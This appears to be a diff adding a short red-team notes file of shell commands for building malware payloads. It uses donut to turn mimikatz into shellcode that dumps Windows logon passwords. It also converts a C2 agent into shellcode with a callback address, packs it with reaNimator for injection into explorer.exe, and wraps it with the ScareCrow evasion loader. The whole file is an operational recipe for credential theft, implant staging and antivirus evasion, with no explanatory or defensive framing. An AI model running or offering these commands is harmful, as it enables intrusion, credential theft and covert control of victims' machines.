@@ -1,0 +1,9 @@
+#### Generate mimikatz shellcode
+/opt/donut/donut /Share/Utils/win/programs/mimikatz64.exe -f 1 -a 2 -o /Share/tmp/mimikatz.bin -p '"privilege::debug" "SEKURLSA::LogonPasswords" exit'
+
+#### Generate Agent shellcode
+/opt/donut/donut /Share/Projects/C2Sharp/Agent/bin/Debug/Agent.exe -f 1 -a 2 -o /Share/tmp/Stager/Agent.bin -p '127.0.0.1:8080'
+
+### Generate Agent Executable
+cd /Share/Projects/reaNimator-modif  && ./reaNimator -f /Share/tmp/Stager/agent.bin -t raw -o /Share/tmp/Stager/TestSelf.exe -e -u -p "explorer.exe"
+cd /Share/tmp/Stager && /opt/ScareCrow/ScareCrow -I /Share/tmp/Stager/agent.bin -Loader binary -domain google.com
